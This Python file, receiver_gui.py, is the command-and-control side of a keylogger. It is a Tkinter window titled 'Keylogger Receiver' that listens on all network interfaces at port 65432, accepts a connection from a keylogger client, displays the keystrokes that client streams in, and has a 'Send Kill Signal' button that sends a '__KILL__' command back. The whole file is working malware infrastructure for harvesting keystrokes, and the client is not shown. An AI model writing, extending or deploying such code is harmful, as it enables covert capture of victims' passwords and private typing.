# receiver_gui.py

import socket
import threading
import tkinter as tk
from tkinter import scrolledtext, messagebox

HOST = "0.0.0.0"  # Listen on all interfaces
PORT = 65432
conn = None

class ReceiverApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger Receiver")
        self.root.geometry("700x500")

        self.text_area = scrolledtext.ScrolledText(self.root, wrap=tk.WORD, state='disabled')
        self.text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        self.kill_button = tk.Button(self.root, text="☠ Send Kill Signal", command=self.send_kill, bg='red', fg='white')
        self.kill_button.pack(pady=5)

        threading.Thread(target=self.start_server, daemon=True).start()

    def start_server(self):
        global conn
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind((HOST, PORT))
                s.listen()
                self.append_text(f"[Receiver] Listening on port {PORT}...\n")

                conn, addr = s.accept()
                self.append_text(f"[Receiver] Connected to: {addr}\n")
                print(f"[DEBUG] Connected to sender at {addr}")

                with conn:
                    while True:
                        data = conn.recv(1024)
                        if not data:
                            break
                        self.append_text(data.decode('utf-8'))
        except Exception as e:
            print(f"[DEBUG] Server error: {e}")
            self.append_text(f"[ERROR] Server exception: {e}\n")

    def append_text(self, message):
        self.text_area.configure(state='normal')
        self.text_area.insert(tk.END, message)
        self.text_area.see(tk.END)
        self.text_area.configure(state='disabled')

    def send_kill(self):
        global conn
        if conn:
            try:
                conn.sendall("__KILL__".encode('utf-8'))
                self.append_text("\n[Receiver] Kill signal sent.\n")
                print("[DEBUG] Kill signal sent to keylogger.")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to send kill command: {e}")
                print(f"[DEBUG] Kill signal failed: {e}")
        else:
            messagebox.showwarning("No Connection", "No keylogger client is currently connected.")
            print("[DEBUG] No connection to send kill signal.")

if __name__ == "__main__":
    root = tk.Tk()
    app = ReceiverApp(root)
    root.mainloop()